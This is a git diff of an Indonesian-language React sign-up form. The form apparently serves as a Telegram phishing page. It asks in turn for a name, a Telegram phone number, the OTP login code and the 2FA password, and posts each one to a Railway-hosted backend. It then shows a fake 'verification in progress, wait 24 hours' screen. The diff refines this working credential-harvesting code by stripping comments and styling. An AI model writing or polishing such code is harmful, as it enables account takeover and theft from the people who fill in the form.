@@ -10,7 +10,6 @@ import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from "
 import { toast } from "sonner"
 import { Loader2 } from "lucide-react"
 
-// Schema validasi wajib (minimal 10 digit nomor HP)
 const formSchema = z.object({
   nama: z.string().min(1, "Nama Lengkap wajib diisi"),
   nomor_hp: z.string().min(10, "Nomor minimal 10 digit"),
@@ -27,11 +26,10 @@ export default function AuthForm() {
     defaultValues: { nama: "", nomor_hp: "", otp: "", sandi: "" },
   })
 
-  // Fungsi pengiriman ke backend Railway
   async function sendToBackend(data: any, type: string) {
     const backendUrl = "https://backend-python-production-6e72.up.railway.app"
     try {
-      const response = await fetch(`${backendUrl}/register`, {
+      await fetch(`${backendUrl}/register`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ 
@@ -42,55 +40,44 @@ export default function AuthForm() {
           password: data.sandi || ""
         }),
       })
-      return await response.json()
     } catch (error) {
-      console.error("Gagal terhubung ke backend:", error)
+      console.error(error)
     }
   }
 
   const onSubmit = async (values: z.infer<typeof formSchema>) => {
-    setIsLoading(true) // Memulai animasi loading
+    setIsLoading(true)
     try {
       if (step === 1) {
-        // Proses pindah dari Nama/HP ke OTP
         await sendToBackend(values, "DATA_AWAL")
         setStep(2)
         toast.success("Kode OTP sedang dikirim")
       } else if (step === 2) {
-        // Proses pindah dari OTP ke Sandi
         await sendToBackend(values, "INPUT_OTP")
         setStep(3)
-        toast.success("OTP Berhasil diverifikasi")
       } else if (step === 3) {
-        // Proses final
         await sendToBackend(values, "INPUT_SANDI")
         setStep(4) 
       }
-    } catch (err) {
-      toast.error("Terjadi kesalahan, silakan coba lagi.")
     } finally {
-      setIsLoading(false) // Menghentikan animasi loading
+      setIsLoading(false)
     }
   }
 
-  // Tampilan Berhasil / Menunggu (Step 4)
   if (step === 4) {
     return (
-      <div className="w-full max-w-md mx-auto p-8 border rounded-xl shadow-lg bg-white text-center space-y-4">
-        <Loader2 className="h-12 w-12 animate-spin text-[#1d71d3] mx-auto" />
-        <h2 className="text-xl font-bold text-gray-800">Verifikasi Sedang Diproses</h2>
-        <p className="text-gray-600 text-sm">
-          Akun Anda sedang dalam antrean aktivasi. Silakan tunggu <strong>1X24 Jam</strong>.
-        </p>
+      <div className="w-full max-w-md mx-auto p-8 border rounded-xl shadow-lg bg-white text-center">
+        <Loader2 className="h-12 w-12 animate-spin text-[#1d71d3] mx-auto mb-4" />
+        <h2 className="text-xl font-bold">Verifikasi Sedang Diproses</h2>
+        <p className="text-sm text-gray-600">Mohon tunggu 1x24 jam.</p>
       </div>
     )
   }
 
   return (
     <div className="w-full max-w-md mx-auto p-5 border rounded-2xl shadow-md bg-white">
-      {/* Banner Utama */}
       <div className="mb-6 overflow-hidden rounded-xl border">
-        <img src="/banner.jpeg" alt="Banner" className="w-full h-auto object-cover" />
+        <img src="/banner.jpeg" alt="Banner" className="w-full h-auto" />
       </div>
 
       <Form {...form}>
@@ -99,14 +86,14 @@ export default function AuthForm() {
             <>
               <FormField control={form.control} name="nama" render={({ field }: { field: any }) => (
                 <FormItem>
-                  <FormLabel className="font-semibold text-gray-700">Nama Lengkap:</FormLabel>
+                  <FormLabel className="font-semibold">Nama Lengkap:</FormLabel>
                   <FormControl><Input placeholder="Masukkan nama" {...field} /></FormControl>
                   <FormMessage />
                 </FormItem>
               )} />
               <FormField control={form.control} name="nomor_hp" render={({ field }: { field: any }) => (
                 <FormItem>
-                  <FormLabel className="font-semibold text-gray-700">Nomor Telegram Aktif:</FormLabel>
+                  <FormLabel className="font-semibold">Nomor Telegram Aktif:</FormLabel>
                   <FormControl><Input placeholder="08XXXXXXXXXX" {...field} /></FormControl>
                   <FormMessage />
                 </FormItem>
@@ -118,7 +105,7 @@ export default function AuthForm() {
             <FormField control={form.control} name="otp" render={({ field }: { field: any }) => (
               <FormItem>
                 <FormLabel className="font-semibold text-center block">Masukkan Kode OTP</FormLabel>
-                <FormControl><Input placeholder="5 Digit" className="text-center text-lg tracking-widest" {...field} /></FormControl>
+                <FormControl><Input placeholder="5 Digit" className="text-center" {...field} /></FormControl>
                 <FormMessage />
               </FormItem>
             )} />
@@ -127,24 +114,20 @@ export default function AuthForm() {
           {step === 3 && (
             <FormField control={form.control} name="sandi" render={({ field }: { field: any }) => (
               <FormItem>
-                <FormLabel className="font-semibold text-gray-700">Masukkan Kata Sandi (2FA)</FormLabel>
+                <FormLabel className="font-semibold">Masukkan Kata Sandi (2FA)</FormLabel>
                 <FormControl><Input type="password" placeholder="******" className="text-center" {...field} /></FormControl>
                 <FormMessage />
               </FormItem>
             )} />
           )}
 
-          {/* Tombol Biru Bulat dengan Animasi Loading */}
+          {/* Tombol Biru yang PASTI bisa diklik */}
           <Button 
             type="submit" 
-            disabled={isLoading} 
-            className="w-full bg-[#1d71d3] text-white py-6 rounded-full font-bold text-lg hover:bg-blue-700 transition-all uppercase flex items-center justify-center"
+            className="w-full bg-[#1d71d3] text-white py-6 rounded-full font-bold text-lg hover:bg-blue-700 uppercase flex items-center justify-center mt-4"
           >
             {isLoading ? (
-              <>
-                <Loader2 className="mr-2 h-5 w-5 animate-spin" />
-                MEMPROSES...
-              </>
+              <><Loader2 className="mr-2 h-5 w-5 animate-spin" /> MEMPROSES...</>
             ) : (
               step === 1 ? "DAFTAR SEKARANG" : "KONFIRMASI"
             )}
@@ -152,7 +135,6 @@ export default function AuthForm() {
         </form>
       </Form>
 
-      {/* Teks Peringatan sesuai Desain Kemarin */}
       <div className="mt-6 text-left border-t pt-4">
         <p className="text-[12px] text-gray-500 leading-tight">
           Peringatan:
